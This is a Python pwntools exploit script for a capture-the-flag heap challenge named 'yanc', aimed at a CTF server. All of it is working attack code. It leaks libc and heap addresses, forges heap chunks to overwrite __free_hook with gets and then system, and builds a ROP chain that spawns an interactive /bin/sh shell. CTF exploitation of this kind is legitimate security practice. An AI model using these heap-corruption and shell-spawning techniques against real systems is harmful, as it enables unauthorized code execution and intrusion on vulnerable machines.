#!/usr/bin/python3

from pwn import *

from time import sleep

libc = ELF("./libc.so.6")
#r = process("./yanc")

r = remote("pwn.chal.ctf.gdgalgiers.com", 1406)

def sl(a):
    r.sendlineafter(": ", a)

def s(a):
    r.sendafter(": ", a)

# Size is between 0x70 and 0xd0

t = 0.6
def alloc(index, size, title, data):
    sl("1")
    sleep(t)
    sl(str(index))
    sleep(t)
    sl(str(size))
    sleep(t)
    s(title)
    sleep(t)
    s(data)

def show(index):
    sl("2")
    sleep(t)
    sl(str(index))

def edit_once(index, title):
    sl("3")
    sleep(t)
    sl(str(index))
    sleep(t)
    s(title)

def free(index):
    sl("4")
    sleep(t)
    sl(str(index))
    sleep(t)

# Can have negative integers
def clear_at(index):
    sl("5")
    sl(str(index))



for i in range(8):
    alloc(i, 0xb8, b"M", b"A")
alloc(8, 0x71, "fence", "N")
for i in range(8):
    free(i)

for i in range(7):
    alloc(i, 0xb8, b"M", b"A")
# This one gonna get us libc leak
alloc(7, 0x98, b"A", b"A")
show(7)
r.recvuntil("ID: ")
libc_leak = int(r.recvline().strip())
log.info("Libc leak @ 0x%x", libc_leak)


show(1)
r.recvuntil("ID: ")
heap_leak = int(r.recvline().strip())
log.info("Heap leak @ 0x%x", heap_leak)
heap_base = heap_leak - 0x601

alloc(9, 0xb8, "M", "A")
alloc(10, 0x78, "fen", "ce")
for i in range(7):
    free(i)
#r.interactive()
free(9)


libc.address = libc_leak - 0x1ebc07
log.warn("Libc base @ 0x%x", libc.address)
payload  = p64(heap_base + 0xa30) + p64(heap_base + 0xbb0)
payload += p64(heap_base + 0xba0) + p64(heap_base + 0xbf0)
payload += p64(0) + p64(heap_base + 0xbe0 - 0x30)
payload += p64(0) + p64(heap_base + 0xbe0 -  0x20)
payload += p64(0) + p64(heap_base + 0xbe0 - 0x10)
payload += p64(0) + p64(heap_base + 0xbe0)
payload += p64(libc.sym.__free_hook) * 2

alloc(11, 0xbf, "House", payload)
edit_once(9, p64(heap_base + 0xba0))

pop_rdi = libc.address + 0x0000000000026b72

rop  = p64(pop_rdi) 
rop += p64(next(libc.search(b"/bin/sh")))
rop += p64(pop_rdi+1)
rop += p64(libc.sym.system)


payload = cyclic_metasploit(0x90)
payload += p64(heap_base + 0x418)
payload += p64(pop_rdi+1)

alloc(0, 0xb8, "H", payload)
alloc(1, 0xb8, "JEMJEM", p64(heap_base) + rop)
for i in range(2, 7):
    alloc(i, 0xb8, "H", "H")
alloc(13, 0xb8, "h", "h")
alloc(14, 0xb8, "h", p64(libc.sym.__free_hook-0x10))
alloc(15, 0xb8, "h", cyclic_metasploit(0xb0))
alloc(12, 0xb8, "h", p64(libc.sym.gets))

free(0)
sleep(0.5)
r.sendline("/bin/sh\x00"*40)
r.recv(1024)

free(12)
sleep(0.5)
r.sendline(p64(0)*2 + p64(libc.sym.system))

free(1)
r.interactive()
